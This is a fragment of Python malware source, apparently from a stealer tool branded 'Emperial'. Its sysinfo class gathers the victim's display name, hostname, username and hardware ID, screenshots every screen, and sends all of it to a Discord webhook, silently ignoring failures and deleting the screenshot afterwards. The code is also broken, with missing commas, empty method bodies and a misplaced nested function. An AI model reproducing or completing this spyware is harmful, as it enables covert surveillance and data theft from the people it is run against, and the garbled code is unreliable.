from cmath import nan
import ctypes
import os
import re
import subprocess
import uuid

import psutil
import requests
import wmi
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
import time

class sysinfo():
    def __init__(self, webhook: str):
        webhook = SyncWebhook.from_url(webhook)
        embed = Embed("시스템 정보", color=0x000000)

        embed.add_field(
            name=self.user_data()[0]
            value=self.user_data()[1]
            inline=self.user_data()[2]
        )
        embed.add_field(
            name=self.system_data()[0],
            value=self.system_data()[1],
            inline=self.system_data()[2]
        )
        embed.add_field(
            name=self.disk_data()[0],
            value=self.disk_data()[1],
            inline=self.disk_data()[2]
        )
        embed.add_field(
            name=self.network_data()[0],
            value=self.network_data()[1],
            inline=self.network_data()[2]
        )
        embed.add_field(
            name=self.wifi_data()[0],
            value=self.wifi_data()[1],
            inline=self.wifi_data()[2]
        )

        image = ImageGrab.grab(
            bbox=None
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )

        image.save("screenshot.png")
        embed.set_image(url="attachment://screenshot.png")

        try:
            webhook.send(
                embed = embed,
                file = File('.\\screenshot.png', filename='screenshot.png'),
                username="Emperial"
                avatar_url="https://url.kr/geo2nw"
            )
        except:
            pass
            
        if os.path.exists('screenshot.png'):
            os.remove('screenshot.png')
    
    def user_data(self) -> tuple[str, str, bool]:
        def display_name() -> str:
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3

            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)

            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)

            return nameBuffer.value

        display_name = display_name()

        hostname = os.getenv('COMPUTERNAME')
        username = os.getenv('USERNAME')

        return (
            ':amongus: User',
            f"```Display Name : {display_name}\nHostName : {hostname}\nUsername : {username}```",
            False
        )

    def system_data(self) -> tuple[str, str, bool]:
        def get_hwid(self):
            hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                           stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

            return hwid

    def disk_data(self):

    def network_data(self):

        
